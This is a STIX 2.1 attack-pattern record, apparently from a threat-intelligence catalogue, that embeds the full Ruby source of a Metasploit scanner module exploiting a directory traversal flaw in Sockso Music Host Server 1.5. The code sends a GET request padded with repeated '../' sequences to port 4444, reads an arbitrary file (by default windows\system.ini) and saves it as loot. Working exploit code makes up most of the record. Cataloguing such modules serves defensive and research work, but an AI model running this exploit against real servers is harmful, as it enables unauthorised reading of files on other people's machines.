{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c93b9d7c-7400-4cad-b6b1-111a2a855ead",
    "created": "2024-08-14T16:28:48.063865Z",
    "modified": "2024-08-14T16:28:48.063868Z",
    "name": "Sockso Music Host Server 1.5 Directory Traversal",
    "description": " This module exploits a directory traversal bug in Sockso on port 4444.  This is done by using \"../\" in the path to retrieve a file on a vulnerable machine.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/sockso_traversal.rb",
            "external_id": "sockso_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sockso Music Host Server 1.5 Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal bug in Sockso on port\n        4444.  This is done by using \"../\" in the path to retrieve a file on\n        a vulnerable machine.\n      },\n      'References'     =>\n        [\n          [ 'URL', 'http://aluigi.altervista.org/adv/sockso_1-adv.txt' ],\n        ],\n      'Author'         =>\n        [\n          'Luigi Auriemma',  #Initial discovery, poc\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-03-14'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(4444),\n        OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\\\system.ini'])\n      ])\n  end\n\n  def run_host(ip)\n    trav = \"file/\"\n    trav << \"../\" * 10\n\n    file = datastore['FILEPATH']\n    file = file[1,file.length] if file[0,1] == \"\\\\\"\n\n    uri = \"/#{trav}#{file}\"\n    print_status(\"#{ip}:#{rport} - Retriving #{file}\")\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => uri\n    }, 25)\n\n    print_status(\"#{ip}:#{rport} returns: #{res.code.to_s}\")\n\n    if res and res.body.empty?\n      print_error(\"No file to download (empty)\")\n    else\n      fname = File.basename(datastore['FILEPATH'])\n      path = store_loot(\n        'netdecision.http',\n        'application/octet-stream',\n        ip,\n        res.body,\n        fname)\n      print_status(\"File saved in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-03-14"
}